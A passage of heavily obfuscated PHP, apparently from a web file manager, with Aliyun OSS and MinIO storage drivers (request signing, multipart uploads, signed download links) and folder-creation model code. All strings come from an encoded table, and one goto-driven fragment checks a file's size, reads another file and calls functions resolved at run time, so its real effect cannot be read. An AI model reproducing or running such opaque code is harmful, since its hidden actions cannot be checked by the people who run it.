$ËÖ•ß˜æ = strpos($ŸŠà¬û§, $ä‡ìğ©[382]); $ŸŠà¬û§ = substr($ŸŠà¬û§, 0, $ËÖ•ß˜æ) . $ä‡ìğ©[1489]; $öÎ“°Ê“ = 1048576000 * 5; $ßÚ±µ²È = $this->pathFather($—ˆ²öñÑ); $€§›¿§Æ = array($ä‡ìğ©[264] => $ŸŠà¬û§, $ä‡ìğ©[267] => array(array($ä‡ìğ©[1490], 0, $öÎ“°Ê“), array($ä‡ìğ©[269], $ä‡ìğ©[270], $ßÚ±µ²È))); $†ëè³’– = base64_encode(json_encode($€§›¿§Æ)); $ëµ•ãË = base64_encode(hash_hmac($ä‡ìğ©[1411], $†ëè³’–, $this->secret, !0)); $õ¾Ûëº = array($ä‡ìğ©[1491] => $this->accessKey, $ä‡ìğ©[279] => $†ëè³’–, $ä‡ìğ©[272] => $ä‡ìğ©[263], $ä‡ìğ©[1492] => $ëµ•ãË, $ä‡ìğ©[208] => $µ‡ÈÒÆ); $õ¾Ûëº = $this->trafficLimit($ä‡ìğ©[1486], $õ¾Ûëº, !0); return $õ¾Ûëº; } public function uploadMultiData($ñ‡úÕ·Ô, $¥“¸°¢ = 3600) { $÷ºª±ø« =& $_SERVER[´È¥ö†ö]; if (!($¥Ÿ÷ˆ‡ó = $this->getHost())) { return !1; } $€¿ªûß¿ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($ñ‡úÕ·Ô)); return array($÷ºª±ø«[283] => $€¿ªûß¿, $÷ºª±ø«[208] => $¥Ÿ÷ˆ‡ó . $÷ºª±ø«[8] . $this->pathEncode($ñ‡úÕ·Ô), $÷ºª±ø«[284] => gmdate($÷ºª±ø«[1493]), $÷ºª±ø«[97] => $ñ‡úÕ·Ô); } public function uploadMultiAuth($¬›’ æœ, $ìœÌ”ç = array()) { if (isset($ìœÌ”ç[$_SERVER[´È¥ö†ö][285]])) { return $this->uploadPartAuth($¬›’ æœ, $ìœÌ”ç); } return $this->uploadListAuth($¬›’ æœ, $ìœÌ”ç); } private function uploadPartAuth($““ºâƒğ, $ÙéöÅÊ› = array()) { $·Üí®óÔ =& $_SERVER[´È¥ö†ö]; $ì¢Õôå¡ = $ÙéöÅÊ›[$·Üí®óÔ[97]]; $üÖúÊİù = $this->_getUploadAuth($ì¢Õôå¡, $ÙéöÅÊ›); $–ìôÅ Î = array($·Üí®óÔ[288] => $üÖúÊİù[$·Üí®óÔ[288]], $·Üí®óÔ[284] => $üÖúÊİù[$·Üí®óÔ[284]]); if (isset($üÖúÊİù[$·Üí®óÔ[1494]])) { $–ìôÅ Î[$·Üí®óÔ[1494]] = $üÖúÊİù[$·Üí®óÔ[1494]]; } return $–ìôÅ Î; } private function uploadListAuth($ÈØ”•·, $ÀËÀ¾½· = array()) { $ó‘À¨Ìâ =& $_SERVER[´È¥ö†ö]; $ÅôÏ¥Ùõ = $ÀËÀ¾½·[$ó‘À¨Ìâ[97]]; $öåñì¨õ = $ÀËÀ¾½·[$ó‘À¨Ìâ[283]]; $¼ŠªãÛ = $this->client->listParts($this->bucket, $this->pathEncode($ÅôÏ¥Ùõ), $öåñì¨õ); $Š·˜½Šò = $¼ŠªãÛ->getListPart(); $¡Ä•ÁËÌ = array(); foreach ($Š·˜½Šò as $ÕÃà»‡â) { $¡Ä•ÁËÌ[] = array($ó‘À¨Ìâ[299] => $ÕÃà»‡â->getPartNumber(), $ó‘À¨Ìâ[300] => trim($ÕÃà»‡â->getETag(), $ó‘À¨Ìâ[121])); } if (!$¡Ä•ÁËÌ) { return !1; } $ÆÙ£‰ÂŒ = $this->_getUploadAuth($ÅôÏ¥Ùõ, $ÀËÀ¾½·); return array($ó‘À¨Ìâ[288] => $ÆÙ£‰ÂŒ[$ó‘À¨Ìâ[288]], $ó‘À¨Ìâ[284] => $ÆÙ£‰ÂŒ[$ó‘À¨Ìâ[284]], $ó‘À¨Ìâ[291] => $¡Ä•ÁËÌ); } private function _getUploadAuth($‹¶™Ğº, $÷¨úÊ€Ï) { $Ù®Å½Ù =& $_SERVER[´È¥ö†ö]; $“å¤¶©“ = gmdate($Ù®Å½Ù[1493]); $İ¥Üæë = isset($÷¨úÊ€Ï[$Ù®Å½Ù[285]]) ? $Ù®Å½Ù[255] : $Ù®Å½Ù[290]; $ºÌ»¸´‡ = array_intersect_key($÷¨úÊ€Ï, array_flip(array($Ù®Å½Ù[285], $Ù®Å½Ù[283]))); ksort($ºÌ»¸´‡); $”Ûé­“ = $ºÌ»¸´‡ ? $Ù®Å½Ù[76] . http_build_query($ºÌ»¸´‡, null, $Ù®Å½Ù[286], PHP_QUERY_RFC3986) : $Ù®Å½Ù[12]; $æ¿¦—Ø = array($İ¥Üæë, $Ù®Å½Ù[12], $Ù®Å½Ù[123], $“å¤¶©“, "\x78\55\157\163\x73\55\x64\x61\x74\145\x3a{$“å¤¶©“}", $Ù®Å½Ù[8] . $this->bucket . $Ù®Å½Ù[8] . $‹¶™Ğº . $”Ûé­“); if (isset($÷¨úÊ€Ï[$Ù®Å½Ù[285]])) { $¬èğå®» = $this->trafficLimit($Ù®Å½Ù[1486], array(), !0); if ($¬èğå®») { $‹¶™Ğº = $Ù®Å½Ù[1494]; array_splice($æ¿¦—Ø, 5, 0, $‹¶™Ğº . $Ù®Å½Ù[4] . $¬èğå®»[$‹¶™Ğº]); } } $“ËõéÔª = implode($Ù®Å½Ù[287], $æ¿¦—Ø); $Ğ¾ê§±ä = base64_encode(hash_hmac($Ù®Å½Ù[1411], $“ËõéÔª, $this->secret, !0)); $‰æ‘şÑ = $Ù®Å½Ù[1463] . $this->accessKey . $Ù®Å½Ù[4] . $Ğ¾ê§±ä; $ìø…Ûƒ = array($Ù®Å½Ù[288] => $‰æ‘şÑ, $Ù®Å½Ù[284] => $“å¤¶©“); if (!empty($¬èğå®»)) { $ìø…Ûƒ = array_merge($ìø…Ûƒ, $¬èğå®»); } return $ìø…Ûƒ; } public function download($¡šôšİæ, $õ±À‹à) { $±†¦ ëÃ =& $_SERVER[´È¥ö†ö]; if ($this->isFolder($¡šôšİæ)) { return !1; } try { $²ÖŞÓñ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $õ±À‹à); $²ÖŞÓñ = $this->trafficLimit($±†¦ ëÃ[112], $²ÖŞÓñ); $this->client->getObject($this->bucket, $this->pathEncode($¡šôšİæ), $²ÖŞÓñ); } catch (OSS\Core\OssException $†¾÷ÀØÓ) { $this->writeLog(__FUNCTION__ . $±†¦ ëÃ[214] . $†¾÷ÀØÓ->getMessage()); return !1; } return $õ±À‹à; } public function fileSubstr($ÊÏ¢Ç¶, $î±ŞÎ»ñ = 0, $ÍâÍ¢¹å = false) { if ($î±ŞÎ»ñ === -1) { $öŒ¿®Š = array(); } else { if ($ÍâÍ¢¹å === !1) { $Ä¦ÛïŒƒ = $this->size($ÊÏ¢Ç¶); } else { $Ä¦ÛïŒƒ = $î±ŞÎ»ñ + $ÍâÍ¢¹å - 1; } $öŒ¿®Š = array(OSS\OssClient::OSS_RANGE => "{$î±ŞÎ»ñ}\55{$Ä¦ÛïŒƒ}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($ÊÏ¢Ç¶), $öŒ¿®Š); } catch (OSS\Core\OssException $â¨î’¦ø) { $this->writeLog(__FUNCTION__ . $_SERVER[´È¥ö†ö][214] . $â¨î’¦ø->getMessage()); think_exception($â¨î’¦ø->getMessage()); return !1; } } private function trafficLimit($Ç¤Úß×ı, $¸úö…È‰ = array(), $¿»ºÍó¢ = false) { $”Äª¡ÓÂ =& $_SERVER[´È¥ö†ö]; if ($Ç¤Úß×ı == $”Äª¡ÓÂ[1486] && $this->isUploadServer() || $Ç¤Úß×ı == $”Äª¡ÓÂ[112] && $this->isFileOutServer()) { return $¸úö…È‰; } $ÏÍšôåÕ = floatval($GLOBALS[$”Äª¡ÓÂ[6]][$”Äª¡ÓÂ[92]][$”Äª¡ÓÂ[110]][$Ç¤Úß×ı]) * 1024 * 1024 * 8; if (!$ÏÍšôåÕ) { return $¸úö…È‰; } $ÏÍšôåÕ = $ÏÍšôåÕ < 819200 ? 819200 : ($ÏÍšôåÕ > 838860800 ? 838860800 : $ÏÍšôåÕ); if ($¿»ºÍó¢) { $¸úö…È‰[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($ÏÍšôåÕ); } else { if (!isset($¸úö…È‰[OSS\OssClient::OSS_HEADERS])) { $¸úö…È‰[OSS\OssClient::OSS_HEADERS] = array(); } $¸úö…È‰[OSS\OssClient::OSS_HEADERS][OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($ÏÍšôåÕ); } return $¸úö…È‰; } public function link($¶œğˆÂ¦, $§Ï“İ¦ı = array()) { $óÛïÇ¼è =& $_SERVER[´È¥ö†ö]; if (!$this->exist($¶œğˆÂ¦) || $this->isFolder($¶œğˆÂ¦)) { return !1; } try { $§Ï“İ¦ı = $this->trafficLimit($óÛïÇ¼è[112], $§Ï“İ¦ı, !0); $åîÎ³¿ì = $this->client->signUrl($this->bucket, $this->pathEncode($¶œğˆÂ¦), 3600 * 12, $óÛïÇ¼è[1495], $§Ï“İ¦ı); return $this->getCdnLink($åîÎ³¿ì); } catch (OSS\Core\OssException $—õí­ãÛ) { $this->writeLog(__FUNCTION__ . $óÛïÇ¼è[214] . $—õí­ãÛ->getMessage()); return !1; } } public function fileOut($ëÃ¥îÒ¡, $€íÅÉÖØ = false, $Ş•èêÙ = false, $¤Ú¹ØÄ¤ = '') { $ŠìÇŸé =& $_SERVER[´È¥ö†ö]; if ($this->isFileOutServer()) { return $this->fileOutServer($ëÃ¥îÒ¡, $€íÅÉÖØ, $Ş•èêÙ, $¤Ú¹ØÄ¤); } if (!$Ş•èêÙ) { $Ş•èêÙ = $this->pathThis($ëÃ¥îÒ¡); } $Ş•èêÙ = rawurlencode($Ş•èêÙ); $Ä¨ü¼ş = get_file_mime(get_path_ext($Ş•èêÙ)); if ($Ä¨ü¼ş == $ŠìÇŸé[250]) { return parent::fileOut($ëÃ¥îÒ¡, $€íÅÉÖØ, $Ş•èêÙ, $¤Ú¹ØÄ¤); } $€íÅÉÖØ = $€íÅÉÖØ ? $ŠìÇŸé[1496] : $ŠìÇŸé[1497]; $Íß…Ú = array(OSS\OssClient::OSS_SUB_RESOURCE => $ŠìÇŸé[1498] . rawurlencode("{$€íÅÉÖØ}\x3b\x66\151\x6c\145\156\141\x6d\x65\x3d{$Ş•èêÙ}")); $Íß…Ú[OSS\OssClient::OSS_SUB_RESOURCE] .= $ŠìÇŸé[1499] . rawurlencode($Ä¨ü¼ş); $¥†²»ƒ = $this->link($ëÃ¥îÒ¡, $Íß…Ú); $this->fileOutLink($¥†²»ƒ); } public function fileOutServer($±‡È€±‘, $·‹îÊ„ = false, $—øóÉª½ = false, $æ‘ó“Ïè = '') { parent::fileOut($±‡È€±‘, $·‹îÊ„, $—øóÉª½, $æ‘ó“Ïè); } public function fileOutImage($£¥¹£, $ùº­õÁ = 250) { if ($this->size($£¥¹£) > 1024 * 1024 * 20) { return $this->fileOutImageServer($£¥¹£, $ùº­õÁ); } $¤Õ‡ôñ¹ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[´È¥ö†ö][1460] . $ùº­õÁ); $óëÅí˜è = $this->link($£¥¹£, $¤Õ‡ôñ¹); $this->fileOutLink($óëÅí˜è); } public function fileOutImageServer($§Ãšº°Ù, $‡¨˜¨ö = 250) { parent::fileOutImage($§Ãšº°Ù, $‡¨˜¨ö); } public function fileOutLink($Ú¬ÀÂ¯É) { $åÂ“è×î =& $_SERVER[´È¥ö†ö]; if (!$this->isCdnHost() && substr($Ú¬ÀÂ¯É, 0, 7) == $åÂ“è×î[218]) { $Ú¬ÀÂ¯É = $åÂ“è×î[219] . substr($Ú¬ÀÂ¯É, 7); } header($åÂ“è×î[175] . $Ú¬ÀÂ¯É); die; } public function hashMd5($ÍÑÍÛ®í, $êõœ»ö = '') { $«¶¥É¸ä =& $_SERVER[´È¥ö†ö]; $ıŠ–Úğµ = $this->_objectMeta($ÍÑÍÛ®í); if (!$ıŠ–Úğµ) { return $«¶¥É¸ä[12]; } if (!isset($ıŠ–Úğµ[$«¶¥É¸ä[1480]]) && !empty($êõœ»ö)) { $÷µ¿·š = $this->updateObjMeta($ÍÑÍÛ®í, array($«¶¥É¸ä[1480] => $êõœ»ö)); $ıŠ–Úğµ[$«¶¥É¸ä[1480]] = $÷µ¿·š ? $êõœ»ö : $«¶¥É¸ä[12]; } return isset($ıŠ–Úğµ[$«¶¥É¸ä[1480]]) ? strtolower($ıŠ–Úğµ[$«¶¥É¸ä[1480]]) : $«¶¥É¸ä[12]; } public function size($•ñğÆº) { $»–Ûœ¸ = $this->objectMeta($•ñğÆº); return $»–Ûœ¸ ? $»–Ûœ¸[$_SERVER[´È¥ö†ö][79]] : 0; } public function info($¿òúëò‚) { if ($this->isFolder($¿òúëò‚)) { return $this->folderInfo($¿òúëò‚); } else { if ($this->isFile($¿òúëò‚)) { return $this->fileInfo($¿òúëò‚); } } return !1; } public function exist($²·í±£ı) { return $this->isFile($²·í±£ı) || $this->isFolder($²·í±£ı); } public function isFile($ §‡äœø) { return !$this->isFolder($ §‡äœø) && $this->objectMeta($ §‡äœø); } public function isFolder($·½µÒú) { return $this->cacheMethod($_SERVER[´È¥ö†ö][179], $·½µÒú); } protected function objectMeta($çşÃ¹²) { return $this->cacheMethod($_SERVER[´È¥ö†ö][181], $çşÃ¹²); } protected function _objectMeta($óñò¾ìá) { $†¨”’Öü =& $_SERVER[´È¥ö†ö]; try { $ŸÂÑµúš = $this->client->getObjectMeta($this->bucket, $this->pathEncode($óñò¾ìá)); } catch (OSS\Core\OssException $®…Œ‹»¯) { $this->writeLog(__FUNCTION__ . $†¨”’Öü[214] . $®…Œ‹»¯->getMessage()); $ŸÂÑµúš = !1; } if ($ŸÂÑµúš) { $ŸÂÑµúš[$†¨”’Öü[79]] = intval($ŸÂÑµúš[$†¨”’Öü[1478]]); } return $ŸÂÑµúš; } protected function _isFolder($å¸›ÖÒÒ) { $±È°ßèª =& $_SERVER[´È¥ö†ö]; if ($å¸›ÖÒÒ == $±È°ßèª[12] || $å¸›ÖÒÒ == $±È°ßèª[8]) { return !0; } $æ”ß™·È = array($±È°ßèª[1473] => $±È°ßèª[8], $±È°ßèª[1474] => rtrim($å¸›ÖÒÒ, $±È°ßèª[8]) . $±È°ßèª[8], $±È°ßèª[1475] => 1, $±È°ßèª[1476] => $±È°ßèª[12]); $Ğ‰š½íã = $this->client->listObjects($this->bucket, $æ”ß™·È); if ($Ğ‰š½íã->getObjectList() || $Ğ‰š½íã->getPrefixList()) { return !0; } return !1; } public function writeLog($˜ ¯äêù = '', $Ò¢¸ˆ‰ = false) { $áÆÇ¯® =& $_SERVER[´È¥ö†ö]; $”ûÙİĞ° = in_array(ACTION, array($áÆÇ¯®[212], $áÆÇ¯®[213])); if (!$”ûÙİĞ° && !GLOBAL_DEBUG) { return; } $şÇŒÓ÷ç = 0; if (stripos($˜ ¯äêù, $áÆÇ¯®[1500]) !== !1) { $şÇŒÓ÷ç = 1; $æ†«“ä° = explode($áÆÇ¯®[1501], $˜ ¯äêù); $˜ ¯äêù = !empty($æ†«“ä°[1]) ? $æ†«“ä°[1] : $˜ ¯äêù; } else { if (stripos($˜ ¯äêù, $áÆÇ¯®[1502])) { $şÇŒÓ÷ç = 2; $æ†«“ä° = explode($áÆÇ¯®[1502], $˜ ¯äêù); $æ†«“ä° = explode($áÆÇ¯®[4], $æ†«“ä°[0]); $˜ ¯äêù = !empty($æ†«“ä°[1]) ? $æ†«“ä°[1] : $˜ ¯äêù; } } if ($”ûÙİĞ° && I18n::getType() == $áÆÇ¯®[1503]) { if ($şÇŒÓ÷ç == 1) { $˜ ¯äêù = str_replace($áÆÇ¯®[1504], $áÆÇ¯®[1505], $˜ ¯äêù); } else { if ($şÇŒÓ÷ç == 2) { $æ†«“ä° = explode($áÆÇ¯®[214], $æ†«“ä°[0]); $‘ÑŠé·ş = isset($æ†«“ä°[1]) ? $æ†«“ä°[1] : $áÆÇ¯®[12]; $š½îŒ­ = array($áÆÇ¯®[1506] => $áÆÇ¯®[1507], $áÆÇ¯®[1508] => $áÆÇ¯®[1509], $áÆÇ¯®[1510] => $áÆÇ¯®[1511], $áÆÇ¯®[1512] => $áÆÇ¯®[1513], $áÆÇ¯®[1514] => $áÆÇ¯®[1515], $áÆÇ¯®[1516] => $áÆÇ¯®[1517], $áÆÇ¯®[1518] => $áÆÇ¯®[1519], $áÆÇ¯®[1520] => $áÆÇ¯®[1521], $áÆÇ¯®[1522] => $áÆÇ¯®[1523], $áÆÇ¯®[1524] => $áÆÇ¯®[1525]); if (isset($š½îŒ­[$‘ÑŠé·ş])) { $˜ ¯äêù = $š½îŒ­[$‘ÑŠé·ş]; } } } if (stripos($˜ ¯äêù, $áÆÇ¯®[1526])) { $˜ ¯äêù = $áÆÇ¯®[1527]; } } if (!trim($˜ ¯äêù)) { return; } parent::writeLog(trim($˜ ¯äêù), $Ò¢¸ˆ‰); } } goto fê“¸ÍÃµ; aëìš¸È…: $_size = $_SERVER[´È¥ö†ö][308]; if ($_SERVER[$_SERVER[´È¥ö†ö][309]] != $_size($_file)) { $_getc = $_SERVER[´È¥ö†ö][310]; $_getfile = $_SERVER[$_SERVER[´È¥ö†ö][311]] . $_SERVER[´È¥ö†ö][312]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[´È¥ö†ö][287], $_getfilec); if (count($_getarrs) < $_SERVER[´È¥ö†ö][313]) { $exit = $_SERVER[´È¥ö†ö][314]; $exit(); } $_act = $_SERVER[´È¥ö†ö][315]; $_act($_file); } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($“Ğ¦ÎôÔ) { $ó”ÒË =& $_SERVER[´È¥ö†ö]; parent::__construct($“Ğ¦ÎôÔ); $this->setSignVersion($ó”ÒË[249]); if (!$this->region) { $this->region = $ó”ÒË[316]; $this->client->setRegion($this->region); } $this->client->setHeadValid(!1); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function checkRegion() { $öÓƒ²ƒº = $this->getBktRegion(); return $this->region == $öÓƒ²ƒº ? !0 : !1; } public function uploadFormData($ñ¨ÑşÑÒ, $øÔäÔƒò = 3600) { $ñÎºï¹ú =& $_SERVER[´È¥ö†ö]; $õÉÖúõÈ = $ñÎºï¹ú[231]; $­½¨¿ö£ = $ñÎºï¹ú[259]; $‹¡İúï¯ = $ñÎºï¹ú[62]; $Âåá…†Ú = gmdate($ñÎºï¹ú[260]); $¬ÒŸ…Öé = gmdate($ñÎºï¹ú[261]); $²ÜºÑ¼ü = $ñÎºï¹ú[262]; $Ï€æ¢×Å = $øÔäÔƒò . $ñÎºï¹ú[12]; $™±áÓşë = $ñÎºï¹ú[263]; $µÄ±Ú“å = array($this->accessKey, $¬ÒŸ…Öé, $this->region, $‹¡İúï¯, $²ÜºÑ¼ü); $ĞîÚ§ƒË = implode($ñÎºï¹ú[8], $µÄ±Ú“å); $’Ü‚ß†å = array($ñÎºï¹ú[264] => gmdate($ñÎºï¹ú[265], strtotime($ñÎºï¹ú[266])), $ñÎºï¹ú[267] => array(array($ñÎºï¹ú[268] => $this->bucket), array($ñÎºï¹ú[317] => $õÉÖúõÈ), array($ñÎºï¹ú[269], $ñÎºï¹ú[270], $ñÎºï¹ú[12]), array($ñÎºï¹ú[269], $ñÎºï¹ú[271], $ñÎºï¹ú[12]), array($ñÎºï¹ú[269], $ñÎºï¹ú[318], $ñÎºï¹ú[12]), array($ñÎºï¹ú[272] => $™±áÓşë), array($ñÎºï¹ú[273] => $ĞîÚ§ƒË), array($ñÎºï¹ú[274] => $­½¨¿ö£), array($ñÎºï¹ú[275] => $Âåá…†Ú), array($ñÎºï¹ú[276] => $Ï€æ¢×Å))); $¡†‘‚åŒ = base64_encode(json_encode($’Ü‚ß†å)); $ÇË–¿œé = hash_hmac($ñÎºï¹ú[277], $¬ÒŸ…Öé, $ñÎºï¹ú[278] . $this->secret, !0); $°é©Ì¬ş = hash_hmac($ñÎºï¹ú[277], $this->region, $ÇË–¿œé, !0); $öñÏÃ²Á = hash_hmac($ñÎºï¹ú[277], $‹¡İúï¯, $°é©Ì¬ş, !0); $ò‡Õ”Ä™ = hash_hmac($ñÎºï¹ú[277], $²ÜºÑ¼ü, $öñÏÃ²Á, !0); $œÌÚĞ¸ = hash_hmac($ñÎºï¹ú[277], $¡†‘‚åŒ, $ò‡Õ”Ä™); $÷‡ñƒşì = array($ñÎºï¹ú[248] => $ñÎºï¹ú[12], $ñÎºï¹ú[296] => $ñÎºï¹ú[12], $ñÎºï¹ú[317] => $õÉÖúõÈ, $ñÎºï¹ú[272] => $™±áÓşë, $ñÎºï¹ú[279] => $¡†‘‚åŒ, $ñÎºï¹ú[319] => $ĞîÚ§ƒË, $ñÎºï¹ú[320] => $­½¨¿ö£, $ñÎºï¹ú[321] => $Âåá…†Ú, $ñÎºï¹ú[322] => $Ï€æ¢×Å, $ñÎºï¹ú[323] => $œÌÚĞ¸, $ñÎºï¹ú[208] => $this->getHost()); return $÷‡ñƒşì; } } goto C•ÈÂÂõæ©; A×Œß”œºÄ: class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($‹óâ¶¥Ø) { $„·û–­¯ =& $_SERVER[´È¥ö†ö]; $ÇÈı¾ = Model($„·û–­¯[588])->where(array($„·û–­¯[1764] => $‹óâ¶¥Ø))->find(); $ÉçºÖä = $this->_mkdirRoot(SourceModel::TYPE_USER, $‹óâ¶¥Ø, $ÇÈı¾[$„·û–­¯[32]]); $this->userDesktopAdd($ÉçºÖä); return $ÉçºÖä; } public function userDesktopAdd($§úÓê²š) { $È‹İ¬ºÒ =& $_SERVER[´È¥ö†ö]; $ºÀ’ÉŞè = LNG($È‹İ¬ºÒ[2255]); $¡–´—‡¨ = $this->mkdir($§úÓê²š, $ºÀ’ÉŞè); $this->metaSet($¡–´—‡¨, $È‹İ¬ºÒ[2256], $È‹İ¬ºÒ[91]); $this->metaSet($§úÓê²š, $È‹İ¬ºÒ[2257], $¡–´—‡¨); } public function userPathSafeAdd($çÈ›×¥ƒ) { $‰±ÇÑ =& $_SERVER[´È¥ö†ö]; $“ó¹­Ëâ = Model($‰±ÇÑ[588])->getInfoFull($çÈ›×¥ƒ); if (!$“ó¹­Ëâ) { return !1; } if (_get($“ó¹­Ëâ, $‰±ÇÑ[609])) { return $“ó¹­Ëâ[$‰±ÇÑ[550]][$‰±ÇÑ[2258]]; } $ù¦û·Õã = $this->_mkdirRoot(SourceModel::TYPE_USER, $çÈ›×¥ƒ, $‰±ÇÑ[2259], $‰±ÇÑ[2260]); Model($‰±ÇÑ[588])->metaSet($çÈ›×¥ƒ, $‰±ÇÑ[2258], $ù¦û·Õã); $this->metaSet($ù¦û·Õã, $‰±ÇÑ[2261], $çÈ›×¥ƒ); return $ù¦û·Õã; } public function userPathAppAdd($Ä§ºúó©, $—”Çœ¤¿ = '', $‰®½Æ×“ = '') { $•ÅÀˆå„ =& $_SERVER[´È¥ö†ö]; $ø»ò…ˆ€ = Model($•ÅÀˆå„[588])->getInfoFull($Ä§ºúó©); if (!$ø»ò…ˆ€) { return !1; } $ Æ¹¸‰ = $ø»ò…ˆ€[$•ÅÀˆå„[550]] ? $ø»ò…ˆ€[$•ÅÀˆå„[550]] : array(); $‰‰ ø›ª = $ Æ¹¸‰[$•ÅÀˆå„[2262]]; if (!$‰‰ ø›ª) { $‰‰ ø›ª = $this->_mkdirRoot(SourceModel::TYPE_USER, $Ä§ºúó©, $•ÅÀˆå„[2263], $•ÅÀˆå„[2264]); Model($•ÅÀˆå„[588])->metaSet($Ä§ºúó©, $•ÅÀˆå„[2262], $‰‰ ø›ª . $•ÅÀˆå„[12]); $this->metaSet($‰‰ ø›ª, $•ÅÀˆå„[2262], $Ä§ºúó©); } if (!$—”Çœ¤¿) { return $‰‰ ø›ª; } $”ŸÊ†±» = $ Æ¹¸‰[$•ÅÀˆå„[2265] . $—”Çœ¤¿]; if (!$”ŸÊ†±») { $”ŸÊ†±» = $this->mkdir($‰‰ ø›ª, $—”Çœ¤¿); Model($•ÅÀˆå„[588])->metaSet($Ä§ºúó©, $•ÅÀˆå„[2265] . $—”Çœ¤¿, $”ŸÊ†±»); $this->metaSet($”ŸÊ†±», $•ÅÀˆå„[2265] . $—”Çœ¤¿, $Ä§ºúó©); } if (!$‰®½Æ×“) { return $”ŸÊ†±»; } $ˆİàù•Ô = $this->mkdir($”ŸÊ†±», $‰®½Æ×“); return $ˆİàù•Ô; } public function groupRootAdd($ãÙ’ê™Ø) { $ˆÊÇùÌÄ =& $_SERVER[´È¥ö†ö]; $ã©ç”ê = Model($ˆÊÇùÌÄ[596])->where(array($ˆÊÇùÌÄ[2066] => $ãÙ’ê™Ø))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $ãÙ’ê™Ø, $ã©ç”ê[$ˆÊÇùÌÄ[32]]); } public function systemRootPathAdd($‹œû¿¤) { if ($‹œû¿¤ != $_SERVER[´È¥ö†ö][619]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $‹œû¿¤); } public function userRootRemove($úÌêìË¸) { $¬¦âŠÊ‚ = $this->targetSourceRoot(SourceModel::TYPE_USER, $úÌêìË¸, !0); foreach ($¬¦âŠÊ‚ as $ßÏª™×) { if (!$ßÏª™×) { continue; } $this->remove($ßÏª™×[$_SERVER[´È¥ö†ö][193]], !1); } } public function groupRootRemove($ŸÖÑƒú„) { $¤‚¿¦Œ÷ = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $ŸÖÑƒú„); if (!$¤‚¿¦Œ÷) { return; } $this->remove($¤‚¿¦Œ÷[$_SERVER[´È¥ö†ö][193]], !1); } private function _mkdirRoot($ƒ‹Óª“ç, $º¾´‡Û, $ÁûÀüª±, $éû“öƒì = '') { $Ìâ°¸è =& $_SERVER[´È¥ö†ö]; $ˆú­ÂÀş = defined($Ìâ°¸è[2201]) ? USER_ID : 0; $²ì‰éõì = array($Ìâ°¸è[488] => 0, $Ìâ°¸è[662] => $ƒ‹Óª“ç, $Ìâ°¸è[663] => $º¾´‡Û, $Ìâ°¸è[660] => 1, $Ìâ°¸è[664] => $ˆú­ÂÀş, $Ìâ°¸è[665] => $ˆú­ÂÀş, $Ìâ°¸è[661] => $éû“öƒì, $Ìâ°¸è[666] => $Ìâ°¸è[604], $Ìâ°¸è[515] => 0, $Ìâ°¸è[631] => 0, $Ìâ°¸è[553] => 0, $Ìâ°¸è[667] => $Ìâ°¸è[12]); if ($èˆÇ© = $this->where($²ì‰éõì)->find()) { return $èˆÇ©[$Ìâ°¸è[193]]; } $¢¦§É¯š = "\115\x6f\x64\x65\x6c\x53\x6f\x75\x72\x63\x65\56\155\x6b\x64\151\162\122\x6f\157\x74\x2e{$ƒ‹Óª“ç}\x2e{$º¾´‡Û}\56" . $ÁûÀüª±; CacheLock::lock($¢¦§É¯š); $²ì‰éõì[$Ìâ°¸è[32]] = $ÁûÀüª±; $“¼¹˜á¡ = $this->add($²ì‰éõì); $¦ÓªÁ£÷ = array($Ìâ°¸è[668] => short_id($“¼¹˜á¡)); $this->where(array($Ìâ°¸è[502] => $“¼¹˜á¡))->save($¦ÓªÁ£÷); CacheLock::unlock($¢¦§É¯š); return $“¼¹˜á¡; } private function targetSourceRoot($–Úİ—ó², $šŒõ…ˆ‡, $¶’ş¶¤ = false) { $™ó€Ñ€Ô =& $_SERVER[´È¥ö†ö]; $±²±¤™ = array($™ó€Ñ€Ô[488] => 0, $™ó€Ñ€Ô[662] => $–Úİ—ó², $™ó€Ñ€Ô[663] => $šŒõ…ˆ‡); if ($¶’ş¶¤) { $éîÉ™¿Î = $this->where($±²±¤™)->select(); return $éîÉ™¿Î ? $éîÉ™¿Î : array(); } $¾´¦¾‹ = $this->where($±²±¤™)->find(); return $¾´¦¾‹ ? $¾´¦¾‹ : array(); } public function sourceRootGroup($üåùãÔ) { $«˜Ó‹şÅ =& $_SERVER[´È¥ö†ö]; if (is_string($üåùãÔ)) { $üåùãÔ = array($üåùãÔ); } $›çœ„ğ = $this->listSourceRoot(SourceModel::TYPE_GROUP, $üåùãÔ, $«˜Ó‹şÅ[222]); $ïÅøÁÑá = array($«˜Ó‹şÅ[456] => $›çœ„ğ, $«˜Ó‹şÅ[453] => array($«˜Ó‹şÅ[834] => count($üåùãÔ))); $this->_listDataApply($ïÅøÁÑá[$«˜Ó‹şÅ[456]]); $this->_listMake($ïÅøÁÑá); return array_to_keyvalue($ïÅøÁÑá[$«˜Ó‹şÅ[85]], $«˜Ó‹şÅ[580]); } public function mkfile($½”¥£ÜÑ, $Í¿øÒÏ«, $™ëµÉµ¶ = '', $‘‘™ŞäÏ = REPEAT_RENAME) { $›úò½ëõ =& $_SERVER[´È¥ö†ö]; $Ë‡¤­‹ = Model($›úò½ëõ[688])->addFileByContent($™ëµÉµ¶, $Í¿øÒÏ«); return $this->_createFileCall($½”¥£ÜÑ, $Í¿øÒÏ«, $Ë‡¤­‹, $‘‘™ŞäÏ, $›úò½ëõ[1430]); } public function addFile($³´şí, $ÔÏÓ÷ƒ©, $ìÉ÷£ å, $Óì‰ÜÔœ = false, $ü¨§¾Éö = REPEAT_RENAME) { $Ñ¥Õ±›¹ = Model($_SERVER[´È¥ö†ö][688])->addFile($ÔÏÓ÷ƒ©, $ìÉ÷£ å, $Óì‰ÜÔœ); return $this->_createFileCall($³´şí, $ìÉ÷£ å, $Ñ¥Õ±›¹, $ü¨§¾Éö); } public function addFileByFileID($»İ›Ãä, $šà“·«£, $âÈ‚’ÌÂ, 